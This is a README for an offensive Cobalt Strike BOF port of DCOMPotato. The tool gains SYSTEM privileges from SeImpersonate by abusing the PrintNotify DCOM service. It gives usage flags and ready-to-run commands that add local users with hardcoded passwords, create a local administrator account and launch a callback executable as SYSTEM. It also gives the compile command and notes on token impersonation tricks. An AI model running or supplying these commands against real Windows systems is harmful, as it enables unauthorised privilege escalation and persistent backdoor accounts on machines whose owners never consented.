# BOF - DCOMPotato - PrintNotify

BOF version of [DCOMPotato](https://github.com/zcgonvh/DCOMPotato). Obtain SYSTEM privilege with `SeImpersonate` privilege by passing a malicious `IUnknwon` object to DCOM call of PrintNotify.

By default, [ImpersonationLevel](https://learn.microsoft.com/en-us/windows/win32/com/com-impersonation-level-constants) of PrintNotify service, which was run as SYSTEM, set as `RPC_C_IMP_LEVEL_IMPERSONATE` 

````
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost\print
````



### Usage

```
--pprog : program to launch. Default cmd.exe
--pargs : command line argument to pass to program. Default NULL
--pmode : create process call. 1 for CreateProcessWithTokenW. 2 for CreateProcessAsUser. 3 for NetUserAdd Default 1
```

execute command with `CreateProcessWithTokenW`

```
DCOMPotato --pargs /c whoami /all > C:\temp\whoami.txt
```

execute command with `CreateProcessAsUser`

```
DCOMPotato --pargs /c net user hagrid P@ssw0rd /add --pmode 2
```

execute program with  `CreateProcessWithTokenW`

```
DCOMPotato --pprog C:\temp\callback.exe
```

create local administrator account (hagrid\\P@ss@29hagr!d) with NetUserAdd

```
DCOMPotato --pmode 3
```



### Compile

```
cl /c /GS- /FoDCOMPotato.x64.o /TP DCOMPotato.cpp
```



### Take Away

- You cannot create new object with C++ in Cobalt Strike when loading BOF. You can use struct to implement COM in C instead. Here is a [guide](https://www.codeproject.com/Articles/13601/COM-in-plain-C)
- `==` sign could be overloaded. It was overloaded as `IsEqualGUID` in my case
- Using flag `LOGON_TYPE_NEW_CREDENTIALS` can create a token that can be used for impersonate from `LogonUser` without providing valid credential
- According to the [document](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera), a process that calls `CreateProcessAsUser` require `SE_INCREASE_QUOTA_NAME` and `SE_ASSIGNPRIMARYTOKEN_NAME` privilege.



### References

+ [DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
+ https://github.com/rapid7/metasploit-framework/blob/master/external/source/exploits/ntapphelpcachecontrol/exploit/CaptureImpersonationToken.cpp
+ https://www.codeproject.com/Articles/13601/COM-in-plain-C
+ [MultiPotato](https://github.com/S3cur3Th1sSh1t/MultiPotato)



